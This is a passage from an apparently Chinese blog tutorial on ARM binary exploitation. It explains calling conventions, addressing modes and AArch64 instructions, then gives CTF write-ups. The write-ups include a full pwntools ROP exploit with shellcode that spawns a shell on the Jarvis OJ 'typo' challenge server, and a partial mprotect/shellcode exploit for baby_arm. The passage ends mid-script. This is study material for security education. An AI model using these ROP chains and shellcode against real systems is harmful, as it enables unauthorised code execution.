+ <span class="number">9</span> x <span class="number">4</span></span><br><span class="line">ADDRESS = SP</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">0</span> to <span class="number">7</span></span><br><span class="line">    Ri = MEMORY[ADDRESS]</span><br><span class="line">    ADDRESS = ADDRESS - <span class="number">4</span></span><br><span class="line">LR = MEMORY[ADDRESS]</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-传参"><a href="#3-传参" class="headerlink" title="3. 传参"></a>3. 传参</h2><ol><li>对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。</li><li>在传递参数时，将所有参数看作是存放在连续的内存字单元的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。<strong>如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。</strong></li></ol><h2 id="4-返回值"><a href="#4-返回值" class="headerlink" title="4. 返回值"></a>4. 返回值</h2><ol><li>结果为一个32位整数时，可以通过寄存器R0返回</li><li>结果为一个64位整数时，可以通过寄存器R0和R1返回</li><li>结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回</li><li>结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回</li><li>对于位数更多的结果，需要通过内存来传递。</li></ol><h2 id="5-访址"><a href="#5-访址" class="headerlink" title="5. 访址"></a>5. 访址</h2><ol><li><p>通常，LDR指令被用来从内存中加载数据到寄存器，STR指令被用作将寄存器的值存放到内存中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ LDR操作：从R0指向的地址中取值放到R2中</span><br><span class="line">LDR R2, [R0]   @ [R0] - 数据源地址来自于R0指向的内存地址</span><br><span class="line">@ STR操作：将R2中的值放到R1指向的地址中</span><br><span class="line">STR R2, [R1]   @ [R1] - 目的地址来自于R1在内存中指向的地址</span><br></pre></td></tr></table></figure></li></ol><p>汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.data          ;&#x2F;* 据段是在内存中动态创建的，所以它的在内存中的地址不可预测*&#x2F;</span><br><span class="line">var1: .word 3  ;&#x2F;内存中的第一个变量且赋值为3 *&#x2F;</span><br><span class="line">var2: .word 4 ;&#x2F;* 内存中的第二个变量且赋值为4 *&#x2F;</span><br><span class="line"></span><br><span class="line">.text         ;&#x2F;* 代码段开始 *&#x2F; </span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ldr r0, adr_var1 ;@ 将存放var1值的地址adr_var1加载到寄存器R0中 </span><br><span class="line">    ldr r1, adr_var2 ;@ 将存放var2值的地址adr_var2加载到寄存器R1中 </span><br><span class="line">    ldr r2, [r0]     ;@ 将R0所指向地址中存放的0x3加载到寄存器R2中  </span><br><span class="line">    str r2, [r1]     ;@ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3a</span><br><span class="line">    bkpt        </span><br><span class="line"></span><br><span class="line">adr_var1: .word var1 ;&#x2F;* var1的地址助记符 *&#x2F;</span><br><span class="line">adr_var2: .word var2 ;&#x2F;* var2的地址助记符 *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">000003c8 &lt;main&gt;:</span><br><span class="line"> 3c8:e59f000c ldrr0, [pc, #12]; 3dc &lt;adr_var1&gt;</span><br><span class="line"> 3cc:e59f100c ldrr1, [pc, #12]; 3e0 &lt;adr_var2&gt;</span><br><span class="line"> 3d0:e5902000 ldrr2, [r0]</span><br><span class="line"> 3d4:e5812000 strr2, [r1]</span><br><span class="line"> 3d8:e1200070 bkpt0x0000</span><br><span class="line"></span><br><span class="line">000003dc &lt;adr_var1&gt;:</span><br><span class="line"> 3dc:00011028 .word0x00011028</span><br><span class="line"></span><br><span class="line">000003e0 &lt;adr_var2&gt;:</span><br><span class="line"> 3e0:0001102c .word0x0001102c</span><br></pre></td></tr></table></figure><ol><li><p>这种形如<code>[Ri , num]</code>的方式被称为<strong>立即数作偏移寻址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, #2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。</span><br><span class="line">str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1&#x3D;R1+4。</span><br><span class="line">ldr r3, [r1], #4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1&#x3D;R1+4。</span><br></pre></td></tr></table></figure></li><li><p>形如的<code>[Ri , Rj]</code>方式被称为寄存器作偏移寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 </span><br><span class="line">str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1&#x3D;R1+R2。</span><br><span class="line">ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1&#x3D;R1+R2。</span><br></pre></td></tr></table></figure></li><li><p>形如<code>[Ri , Rj , &lt;shifter&gt;]</code>的方式被称为寄存器缩放值作偏移寻址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。</span><br><span class="line">str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 &#x3D; R1 + R2&lt;&lt;2。</span><br><span class="line">ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 &#x3D; R1 + R2&lt;&lt;2。</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-汇编基础知识"><a href="#6-汇编基础知识" class="headerlink" title="6. 汇编基础知识"></a>6. 汇编基础知识</h2><p>ARM指令主要分为以下六种：跳转，数据处理，程序状态寄存器处理，加载存储，协处理，异常产生指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MOV    X1，X0         ;将寄存器X0的值传送到寄存器X1</span><br><span class="line">ADD    X0，X1，X2     ;寄存器X1和X2的值相加后传送到X0</span><br><span class="line">SUB    X0，X1，X2     ;寄存器X1和X2的值相减后传送到X0</span><br><span class="line">AND    X0，X0，#0xF    ; X0的值与0xF相位与后的值传送到X0</span><br><span class="line">ORR    X0，X0，#9      ; X0的值与9相位或后的值传送到X0</span><br><span class="line">EOR    X0，X0，#0xF    ; X0的值与0xF相异或后的值传送到X0</span><br><span class="line">LDR    X5，[X6，#0x08]        ；X6寄存器加0x08的和的地址值内的数据传送到X5</span><br><span class="line">STR X0, [SP, #0x8]         ；X0寄存器的数据传送到SP+0x8地址值指向的存储空间</span><br><span class="line">STP  x29, x30, [sp, #0x10]    ;入栈指令</span><br><span class="line">LDP  x29, x30, [sp, #0x10]    ;出栈指令</span><br><span class="line">CBZ  ;比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令）</span><br><span class="line">CBNZ ;比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令）</span><br><span class="line">CMP  ;比较指令，相当于SUBS，影响程序状态寄存器CPSR </span><br><span class="line">B&#x2F;BL  ;绝对跳转#imm， 返回地址保存到LR（X30）</span><br><span class="line">RET   ;子程序返回指令，返回地址默认保存在LR（X30）</span><br></pre></td></tr></table></figure><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>跳转指令有两种</p><ol><li>专门跳转指令，实现向前和向后32MB的跳转</li><li>直接修改PC寄存器，向PC内写入目的地址，实现4GB地址空间的跳转</li></ol><p>eg：</p><ol><li><code>B</code>：执行一个简单的跳转，目标地址是相对于当前<code>PC</code>值的偏移地址</li><li><code>BL</code>：跳转之前会把<code>PC</code>值存到<code>R14</code>寄存器中，通常用于函数调用</li><li><code>BLX</code>：和上一个指令相比，多的功能是将处理器的工作状态由<code>ARM</code>变成<code>Thumb</code></li><li><code>BX</code>：可以跳转到<code>ARM</code>指令或者<code>Thumb</code>指令</li></ol><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p>可分为数据传送指令、算术逻辑运算运算、比较指令</p><ol><li><code>MOV</code>：和X86是差不多的</li><li><code>MVN</code>：在转移之前先按位取反</li><li><code>CMP</code>：两个寄存器中的值进行比较，不改变寄存器的值，但是更新CPSR标志寄存器</li><li><code>ADD</code>：把后两个寄存器相加，结果存在第一个寄存器中</li><li><code>SUB</code>：把后两个寄存器相减，结果存在第一个寄存器中</li><li><code>AND</code>：逻辑与</li><li><code>ORR</code>：逻辑或</li><li><code>EOR</code>：异或</li><li><code>MUL</code>：把后两个寄存器相乘，结果存在第一个寄存器中</li></ol><h3 id="程序状态寄存器处理指令"><a href="#程序状态寄存器处理指令" class="headerlink" title="程序状态寄存器处理指令"></a>程序状态寄存器处理指令</h3><ol><li><code>MRS</code>：用于将程序状态寄存器的内容送到通用寄存器</li><li><code>MSR</code>：将操作数的内容送到程序状态寄存器的特定域</li></ol><h3 id="加载存储指令"><a href="#加载存储指令" class="headerlink" title="加载存储指令"></a>加载存储指令</h3><p>适用于在寄存器和存储器之间数据的传输</p><ol><li><code>LDR</code>：将一个32位的数据送到寄存器中</li><li><code>LDRB</code>：将一个8位的数据送到寄存器中，并且把高24位清零</li><li><code>LDRH</code>：将一个16位的数据送到寄存器中，并且把高16位清零</li><li><code>STR</code>：从源寄存器32位存入到存储器中，和前几个指令相比是不清零</li></ol><h3 id="协处理器指令"><a href="#协处理器指令" class="headerlink" title="协处理器指令"></a>协处理器指令</h3><ol><li><code>CDP</code>：用于<code>ARM</code>处理器通知<code>ARM</code>协处理器来处理特定的操作，若协处理器不能完成，则抛出异常</li><li><code>LDC</code>：让协处理器来将源寄存器的内容送到存储器中，若协处理器不能完成操作，则抛出异常</li></ol><h3 id="异常产生指令"><a href="#异常产生指令" class="headerlink" title="异常产生指令"></a>异常产生指令</h3><ol><li><code>SWI</code>：产生软件中断</li><li><code>BKPT</code>：产生软件断点中断</li></ol><h2 id="7-AArch64架构"><a href="#7-AArch64架构" class="headerlink" title="7. AArch64架构"></a>7. AArch64架构</h2><p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。</p><div class="table-container"><table><thead><tr><th style="text-align:center">寄存器名</th><th style="text-align:center">别名</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">SP</td><td style="text-align:center">–</td><td style="text-align:center">Stack Pointer:栈指针</td></tr><tr><td style="text-align:center">R30</td><td style="text-align:center">LR</td><td style="text-align:center">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td></tr><tr><td style="text-align:center">R29</td><td style="text-align:center">FP</td><td style="text-align:center">Frame Pointer:保存函数栈的基地址。</td></tr><tr><td style="text-align:center">R19-R28</td><td style="text-align:center">–</td><td style="text-align:center">Callee-saved registers（含义见上面术语解释）</td></tr><tr><td style="text-align:center">R18</td><td style="text-align:center">–</td><td style="text-align:center">平台寄存器，有特定平台解释其用法。</td></tr><tr><td style="text-align:center">R17</td><td style="text-align:center">IP1</td><td style="text-align:center">The second intra-procedure-call temporary register……</td></tr><tr><td style="text-align:center">R16</td><td style="text-align:center">IP0</td><td style="text-align:center">The first intra-procedure-call temporary register……</td></tr><tr><td style="text-align:center">R9-R15</td><td style="text-align:center">–</td><td style="text-align:center">临时寄存器</td></tr><tr><td style="text-align:center">R8</td><td style="text-align:center">–</td><td style="text-align:center">在一些情况下，返回值是通过R8返回的</td></tr><tr><td style="text-align:center">R0-R7</td><td style="text-align:center">–</td><td style="text-align:center">在函数调用过程中传递参数和返回值</td></tr><tr><td style="text-align:center">NZCV</td><td style="text-align:center">-</td><td style="text-align:center">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td></tr></tbody></table></div><p> <strong>指令集变化</strong></p><ol><li>除了批量加载寄存器指令 LDM/STM, PUSH/POP, 使用STP/LDP 一对加载寄存器指令代替。</li><li>没有提供访问CPSR的单一寄存器，但是提供访问PSTATE的状态域寄存器。</li><li>A64没有协处理器的概念，没有协处理器指令MCR,MRC。</li><li>相比A32少了很多条件执行指令，只有条件跳转和少数数据处理这类指令才有条件执行。</li></ol><p><strong>内存操作指令-load/store</strong></p><p>在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。</p><p>在ARM-v8指令集中，程序支持以下五种寻址方式：</p><ol><li>Base register only (no offset) ：基址寄存器无偏移。形如:<code>[ base { , #0 } ]</code>。</li><li>Base plus offset：基址寄存器加偏移。形如:<code>[ base { , #imm } ]</code>。</li><li>Pre-indexed：事先更新寻址，先变化后操作。形如:<code>[ base , #imm ]!</code>。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。</li><li>Post-indexed：事后更新寻址，先操作后变化。形如:<code>[ base ] , #imm</code>。</li><li>Literal (PC-relative): PC相对寻址。</li></ol><p>常见的Load/Store指令有：</p><p>LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH</p><p>⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half Word(半字-16bit)、SW- Signed Word(带符号字-32bit)</p><p><code>LDR X1 , [X2]</code>——将X2寄存器中的值赋给X1寄存器。</p><p><code>LDR X1 , [X2] ， #4</code>——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。</p><h1 id="0x03-例题"><a href="#0x03-例题" class="headerlink" title="0x03 例题"></a>0x03 例题</h1><h2 id="Jarvis-Typo"><a href="#Jarvis-Typo" class="headerlink" title="Jarvis-Typo"></a>Jarvis-Typo</h2><p>无canary和PIE，静态链接</p><p>直接看padding</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//sh</span><br><span class="line">[~/桌面/ARM_PWN]$ qemu-arm -g 12345 -L /usr/arm-linux-gnueabi ./ARM1 </span><br><span class="line">//gdb</span><br><span class="line">pwndbg&gt; target remote localhost:12345</span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164 </span><br><span class="line"></span><br><span class="line">//offset=112</span><br></pre></td></tr></table></figure><p>栈图如图所示</p><p><img src="/2021/04/29/arm-pwn/image-20210503224659166.png" alt="image-20210503224659166"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./babyheap",env =&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9888</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bin_sh = <span class="number">0x6c384</span></span><br><span class="line"><span class="comment">#0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line">gadget = <span class="number">0x00020904</span></span><br><span class="line">system = <span class="number">0x000110B4</span></span><br><span class="line">pld = <span class="string">b"A"</span>*offset + p32(gadget) + p32(bin_sh) + p32(<span class="number">0</span>) + p32(system)</span><br><span class="line">ru(<span class="string">"if you want to quit"</span>)</span><br><span class="line">sl(<span class="string">"\n"</span>)</span><br><span class="line">ru(<span class="string">"------Begin------"</span>)</span><br><span class="line">sla(<span class="string">"\n"</span>,pld)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="2018上海市baby-arm"><a href="#2018上海市baby-arm" class="headerlink" title="2018上海市baby_arm"></a>2018上海市baby_arm</h2><p>主函数</p><p>汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;main函数</span><br><span class="line">sub_400818</span><br><span class="line">var_s0&#x3D;  0</span><br><span class="line">&#x2F;&#x2F;X30下一条函数的地址，X29是函数栈基址</span><br><span class="line">STP             X29, X30, [SP,#-0x10]! &#x2F;&#x2F;将X29和X30写入SP和SP-0x08</span><br><span class="line">MOV             X29, SP &#x2F;&#x2F;调整FP</span><br><span class="line">BL              sub_400760 &#x2F;&#x2F;跳转0x400760</span><br><span class="line">ADRL            X0, 0x400900 &#x2F;&#x2F;将Name读入X0</span><br><span class="line">MOV             X2, #5  ; n  &#x2F;&#x2F;读参数</span><br><span class="line">MOV             X1, X0  ; buf </span><br><span class="line">MOV             W0, #1  ; fd</span><br><span class="line">BL              .write</span><br><span class="line">ADRL            X0, 0x411068 &#x2F;&#x2F;读参数</span><br><span class="line">MOV             X2, #0x200 ; nbytes</span><br><span class="line">MOV             X1, X0  ; buf</span><br><span class="line">MOV             W0, #0  ; fd</span><br><span class="line">BL              .read</span><br><span class="line">BL              sub_4007F0</span><br><span class="line">MOV             W0, #0</span><br><span class="line">LDP             X29, X30, [SP],#0x10 &#x2F;&#x2F;出栈指令</span><br><span class="line">RET</span><br><span class="line">; End of function sub_400818</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;读取函数</span><br><span class="line">sub_4007F0</span><br><span class="line"></span><br><span class="line">var_50&#x3D; -0x50</span><br><span class="line"></span><br><span class="line">STP             X29, X30, [SP,#-0x50]! &#x2F;&#x2F;入栈指令</span><br><span class="line">MOV             X29, SP &#x2F;&#x2F;改变栈帧</span><br><span class="line">ADD             X0, X29, #0x10 &#x2F;&#x2F;X0传</span><br><span class="line">MOV             X2, #0x200 ; nbytes &#x2F;&#x2F;传参</span><br><span class="line">MOV             X1, X0  ; buf</span><br><span class="line">MOV             W0, #0  ; fd</span><br><span class="line">BL              .read</span><br><span class="line">NOP</span><br><span class="line">LDP             X29, X30, [SP],#0x50</span><br><span class="line">RET</span><br><span class="line">; End of function sub_4007F0</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main_</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Name:"</span>, <span class="number">5u</span>LL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_411068, <span class="number">0x200</span>uLL);</span><br><span class="line">  readstr_();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">readstr_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;v1, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>向bss段写入内容，然后有栈溢出</p></blockquote><p>基本思路：</p><ul><li>rop去mprotect改bss执行权限</li><li>执行bss段shellcode </li></ul><p>重要的是ARM的ROP</p><p>万能gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loc_4008AC                            ; CODE XREF: sub_400868+60↓j</span><br><span class="line">                 LDR             X3, [X21,X19,LSL#3] ;将x21寄存器的地址指向的内容赋给x3寄存器</span><br><span class="line">                 MOV             X2, X22    ;将x22寄存器的内容赋给x2</span><br><span class="line">                 MOV             X1, X23    ;将x23寄存器的内容赋给x1</span><br><span class="line">                 MOV             W0, W24    ;将W24寄存器的内容赋给W0</span><br><span class="line">                 ADD             X19, X19, #1    ;x19寄存器加一</span><br><span class="line">                 BLR             X3    ；跳转到x3寄存器指向的地址</span><br><span class="line">                 CMP             X19, X20    ；比较x19和x20是否相等</span><br><span class="line">                 B.NE            loc_4008AC    ；如果不相等，就跳回loc_4008AC继续执行</span><br><span class="line">loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">                 LDP             X19, X20, [SP,#0x10]    ;将sp+0x10,sp+0x18处的内容给x19,x20</span><br><span class="line">                 LDP             X21, X22, [SP,#0x20]    ;将sp+0x20,sp+0x28处的内容给x21,x22</span><br><span class="line">                 LDP             X23, X24, [SP,#0x30]    ;将sp+0x30,sp+0x38处的内容给x23,x24</span><br><span class="line">                 LDP             X29, X30, [SP],#0x40    ;将sp,sp+0x8处的内容给x29,x30</span><br><span class="line">                 RET</span><br></pre></td></tr></table></figure><blockquote><p>gadget</p><p>4008CC可以控制x19,x20,x21,x22,x23,x24,x29,x30寄存器(<strong>存储返回地址</strong>)</p><p>4008AC可以控制w0,x1,x2,x3，也就是mprotect参数和mprotect地址。</p><p>所以我们只需要控制好堆栈，然后将shellcode的地址放到x30就可以。</p></blockquote><p>最终的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">binary = <span class="string">"./pwn"</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span 